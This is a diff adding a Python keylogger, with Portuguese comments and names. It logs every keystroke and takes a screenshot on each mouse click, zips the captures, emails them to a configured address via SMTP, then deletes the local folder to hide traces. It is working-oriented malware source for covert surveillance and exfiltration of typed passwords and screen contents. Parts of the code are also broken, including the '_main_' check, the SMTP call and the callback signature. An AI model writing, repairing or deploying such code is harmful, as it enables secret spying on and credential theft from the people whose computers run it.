@@ -1,0 +1,96 @@
+from pynput.mouse import Listener as MouseListener
+from pynput.keyboard import Listener as KeyboardListener
+from datetime import datetime
+import re
+import os
+import pyautogui as py
+from zipfile import ZipFile
+from smtplib import SMTP
+import shutil
+
+# Configurações
+smtp_server = 'smtp.example.com'
+from_addr = 'keylogger@example.com'
+to_addr = 'you@example.com'
+dataAtual = datetime.now()
+data = dataAtual.strftime("%d-%m")
+diretorioRaiz = f"/tmp/video/keylogger_{data}/"
+arquivoLog = os.path.join(diretorioRaiz, "keylogger.log")
+
+def criar_diretorio():
+    try:
+        os.makedirs(diretorioRaiz, exist_ok=True)
+    except:
+        pass
+
+def formatar_tecla(tecla):
+    tecla = str(tecla)
+    tecla = re.sub(r'\'', '', tecla)
+    tecla = re.sub(r'Key.space', ' ', tecla)
+    tecla = re.sub(r'Key.enter', '\n', tecla)
+    tecla = re.sub(r'Key.tab', '\t', tecla)
+    tecla = re.sub(r'Key.backspace', 'apagar', tecla)
+    tecla = re.sub(r'Key.*', '', tecla)
+    return tecla
+
+def on_press(tecla):
+    tecla = formatar_tecla(tecla)
+    with open(arquivoLog, 'a') as log:
+        if str(tecla) == str("apagar"):
+            if os.stat(arquivoLog).st_size != 0:
+                tecla = re.sub(r'Key.backspace', '', tecla)
+                log.seek(0, 2)
+                caractere = log.tell()
+                log.truncate(caractere - 1)
+        else:
+            log.write(tecla)
+
+def tirar_screenshot():
+    minhaPrint = py.screenshot()
+    hora = datetime.now()
+    horarioPrint = hora.strftime("%H:%M:%S")
+    horarioPrint = horarioPrint.replace(":", "_")
+    minhaPrint.save(os.path.join(diretorioRaiz, f"printKeylogger_{horarioPrint}.jpg"))
+
+def compactar_e_enviar_email():
+    # Compactar a pasta em um arquivo zip
+    with ZipFile('keylogger.zip', 'w') as zip:
+        for file in os.listdir(diretorioRaiz):
+            zip.write(os.path.join(diretorioRaiz, file))
+
+    # Enviar o arquivo zip por email
+    with SMTP(smtp_server) as smtp:
+        smtp.send_message(
+            from_addr=from_addr,
+            to_addrs=to_addr,
+            subject='Keylogger data',
+            body='Anexo: keylogger.zip',
+            attachments=['keylogger.zip']
+        )
+
+    # Apagar o diretório e seus conteúdos após enviar os arquivos
+    shutil.rmtree(diretorioRaiz)
+
+def main():
+    criar_diretorio()
+    
+    keyboardListener = KeyboardListener(on_press=on_press)
+    mouseListener = MouseListener(on_click=tirar_screenshot)
+
+    keyboardListener.start()
+    mouseListener.start()
+
+    try:
+        keyboardListener.join()
+    except KeyboardInterrupt:
+        pass
+
+    try:
+        mouseListener.join()
+    except KeyboardInterrupt:
+        pass
+
+    compactar_e_enviar_email()
+
+if _name_ == "_main_":
+    main()
